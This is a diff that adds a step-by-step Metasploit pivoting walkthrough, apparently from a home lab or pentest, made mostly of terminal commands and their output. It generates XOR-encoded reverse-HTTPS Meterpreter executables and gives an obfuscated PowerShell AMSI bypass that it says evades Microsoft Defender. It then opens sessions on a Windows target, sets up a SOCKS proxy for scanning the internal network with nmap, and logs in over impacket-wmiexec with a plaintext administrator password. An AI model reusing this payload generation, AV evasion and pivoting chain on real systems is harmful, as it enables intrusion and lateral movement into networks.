@@ -1,0 +1,340 @@
+===========================================================================================================================================
+Pivoting with Meterpreter (Metasploit) on a Windows server
+===========================================================================================================================================
+
+
+===========================================================================================================================================
+Step 1 - Set up the Metasploit handler and generate the Meterpreter payload (reverse HTTPS payload)
+===========================================================================================================================================
+
+1 - Create a self signed SSL certificate that will be used for our reverse HTTPS payload
+-----------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout pentest.
+key -out pentest.crt
+Generating a RSA private key
+.........................................................++++
+............++++
+writing new private key to 'pentest.key'
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:FR
+State or Province Name (full name) [Some-State]:France
+Locality Name (eg, city) []:Paris
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:Company
+Organizational Unit Name (eg, section) []:Company
+Common Name (e.g. server FQDN or YOUR name) []:
+Email Address []:
+
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ cat pentest.key pentest.crt > pentest.pem
+
+
+2 - Generate an encrypted meterpreter ("windows/meterpreter/reverse_https" OR "windows/meterpreter/reverse_winhttps")
+----------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ msfvenom -p windows/meterpreter/reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.1.30 LPORT=443 -a x86 -e x86/bf_xor -f raw -f exe-only -o reversehttps1.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/bf_xor
+x86/bf_xor succeeded with size 904 (iteration=0)
+x86/bf_xor chosen with final size 904
+Payload size: 904 bytes
+Final size of exe-only file: 73802 bytes
+Saved as: reversehttps1.exe
+
+OR
+
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ msfvenom -p windows/meterpreter/reverse_winhttps EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.1.30 LPORT=443 -a x86 -e x86/bf_xor -f raw -f exe-only -o reversehttps2.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/bf_xor
+x86/bf_xor succeeded with size 1061 (iteration=0)
+x86/bf_xor chosen with final size 1061
+Payload size: 1061 bytes
+Final size of exe-only file: 73802 bytes
+Saved as: reversehttps2.exe
+
+
+3 - Set up and launch a Meterpreter handler (windows/meterpreter/reverse_https)
+-----------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 192.168.1.30; set LPO
+RT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableStageEncoding true; set EnableUnicodeEncoding true; set HandlerSSLCert /h
+ome/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem; run -j"
+[!] The following modules were loaded with warnings:
+[!]     /usr/share/metasploit-framework/modules/encoders/x86/bf_xor.rb
+[!] Please see /root/.msf4/logs/framework.log for details.
+
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |
+  +---------------------------+---------------------------+
+  |      __________________   |                           |
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
+  |             )=\           | |  EXPLOIT   \            |
+  |            // \\          | |_____________\_______    |
+  |           //   \\         | |==[msf >]============\   |
+  |          //     \\        | |______________________\  |
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
+  |        //         \\      |  *********************    |
+  +---------------------------+---------------------------+
+  |      o O o                |        \'\/\/\/'/         |
+  |              o O          |         )======(          |
+  |                 o         |       .'  LOOT  '.        |
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
+  | |________________|__|)__| |    |     __||_)     |     |
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
+  |  = = = = = = = = = = = =  |     '--------------'      |
+  +---------------------------+---------------------------+
+
+
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Enable HTTP request and response logging
+with set HttpTrace true
+
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_https
+LHOST => 192.168.1.30
+LPORT => 443
+EXITFUNC => thread
+ExitOnSession => false
+SessionCommunicationTimeout => 0
+EnableStageEncoding => true
+EnableUnicodeEncoding => true
+HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started HTTPS reverse handler on https://192.168.1.30:443
+
+
+===========================================================================================================================================
+Step 2 - Run the Meterpreter payload (reverse HTTPS payload) on the target Windows server
+===========================================================================================================================================
+
+Note: By generating an encrypted meterpreter payload and using an AMSI bypass our payload is not detected nor blocked by the Microsoft Defender AV running on the Windows target.
+
+Microsoft Windows [Version 10.0.19044.2130]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator.PO718687>powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\Administrator.PO718687> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;
+PS C:\Users\Administrator.PO718687> (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+PS C:\Users\Administrator.PO718687> cd .\Documents\Tools-AD\
+PS C:\Users\Administrator.PO718687\Documents\Tools-AD> .\reversehttps1.exe
+PS C:\Users\Administrator.PO718687\Documents\Tools-AD>
+PS C:\Users\Administrator.PO718687\Documents\Tools-AD> .\reversehttps2.exe
+
+
+
+===========================================================================================================================================
+Step 3 - Configure the meterpreter handler (C2 server) to pivot into the internal network of our Windows target using a proxy socks5
+===========================================================================================================================================
+
+msf6 exploit(multi/handler) > sessions -i
+
+Active sessions
+===============
+
+No active sessions.
+
+msf6 exploit(multi/handler) > sessions -i
+
+Active sessions
+===============
+
+No active sessions.
+
+msf6 exploit(multi/handler) >
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: 26lugeb3) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: 26lugeb3) Encoded stage with x86/shikata_ga_nai
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: 26lugeb3) Staging x86 payload (176249 bytes) ...
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: 26lugeb3) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2022-11-01 17:29:15 +0100
+
+msf6 exploit(multi/handler) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                        Connection
+  --  ----  ----                     -----------                        ----------
+  1         meterpreter x86/windows  PO718687\Administrator @ PO718687  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)
+  2         meterpreter x86/windows  PO718687\Administrator @ PO718687  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)
+
+msf6 exploit(multi/handler) >
+
+msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
+
+msf6 auxiliary(server/socks_proxy) > show options
+
+Module options (auxiliary/server/socks_proxy):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        Proxy password for SOCKS5 listener
+   SRVHOST   0.0.0.0          yes       The address to listen on
+   SRVPORT   1080             yes       The port to listen on
+   USERNAME                   no        Proxy username for SOCKS5 listener
+   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)
+
+
+Auxiliary action:
+   Name   Description
+   ----   -----------
+   Proxy  Run a SOCKS proxy server
+
+
+msf6 auxiliary(server/socks_proxy) > cat /etc/proxychains.conf
+[*] exec: cat /etc/proxychains.conf
+
+# proxychains.conf  VER 3.1
+#
+#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
+#
+
+# The option below identifies how the ProxyList is treated.
+# only one option should be uncommented at time,
+# otherwise the last appearing option will be accepted
+#
+#dynamic_chain
+#
+# Dynamic - Each connection will be done via chained proxies
+# all proxies chained in the order as they appear in the list
+# at least one proxy must be online to play in chain
+# (dead proxies are skipped)
+# otherwise EINTR is returned to the app
+#
+strict_chain
+#
+# Strict - Each connection will be done via chained proxies
+# all proxies chained in the order as they appear in the list
+# all proxies must be online to play in chain
+# otherwise EINTR is returned to the app
+#
+#random_chain
+#
+# Random - Each connection will be done via random proxy
+# (or proxy chain, see  chain_len) from the list.
+# this option is good to test your IDS :)
+                                                                                                                                                                            
+# Make sense only if random_chain                                                                                                                                           
+#chain_len = 2                                                                                                                                                              
+                                                                                                                                                                            
+# Quiet mode (no output from library)                                                                                                                                       
+#quiet_mode                                                                                                                                                                 
+                                                                                                                                                                            
+# Proxy DNS requests - no leak for DNS data                                                                                                                                 
+proxy_dns                                                                                                                                                                   
+                                                                                                                                                                            
+# Some timeouts in milliseconds                                                                                                                                             
+tcp_read_time_out 15000                                                                                                                                                     
+tcp_connect_time_out 8000                                                                                                                                                   
+                                                                                                                                                                            
+# ProxyList format                                                                                                                                                          
+#       type  host  port [user pass]                                                                                                                                        
+#       (values separated by 'tab' or 'blank')                                                                                                                              
+#                                                                                                                                                                           
+#                                                                                                                                                                           
+#        Examples:
+#
+#               socks5  192.168.67.78   1080    lamer   secret
+#               http    192.168.89.3    8080    justu   hidden
+#               socks4  192.168.1.49    1080
+#               http    192.168.39.93   8080
+#
+#
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+# socks4  127.0.0.1 9050
+socks5  127.0.0.1 1080
+
+msf6 auxiliary(server/socks_proxy) >
+
+
+============================================================================================================================================
+Step 4 - Use Proxychains on your attack server (e.g. Kali VM) and the tunnel established with meterprter to pivot into the internal network
+============================================================================================================================================
+
+Example 1 - Nmap port scans of internal servers over the meterpreter tunnel
+--------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ proxychains nmap -sT -n -p 80,443 192.168.1.254
+[*] exec: proxychains nmap -sT -n -p 80,443 192.168.1.254
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-01 17:53 CET
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.254:443-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.254:80-<><>-OK
+Nmap scan report for 192.168.1.254
+Host is up (0.027s latency).
+
+PORT    STATE SERVICE
+80/tcp  open  http
+443/tcp open  https
+MAC Address: 68:A3:78:8B:0C:DD (Freebox SAS)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
+
+
+msf6 auxiliary(server/socks_proxy) > proxychains nmap -sT -n -p 3389,445 192.168.1.196
+[*] exec: proxychains nmap -sT -n -p 3389,445 192.168.1.196
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-01 17:54 CET
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:3389-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:445-<><>-OK
+Nmap scan report for 192.168.1.196
+Host is up (0.0055s latency).
+
+PORT     STATE SERVICE
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+MAC Address: 08:00:27:36:26:0A (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
+
+
+Example 2 - wmiexec (impacket) connection to an internal server over the meterpreter tunnel
+--------------------------------------------------------------------------------------------
+
+msf6 auxiliary(server/socks_proxy) > proxychains impacket-wmiexec administrator:Jesuisunepetitepistache2022@192.168.1.196
+[*] exec: proxychains impacket-wmiexec administrator:Jesuisunepetitepistache2022@192.168.1.196
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation
+
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:445-<><>-OK
+[*] SMBv3.0 dialect used
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:135-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:49666-<><>-OK
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+webserver1\administrator
+
+C:\>hostname
+Webserver1
+
+C:\>exit
+
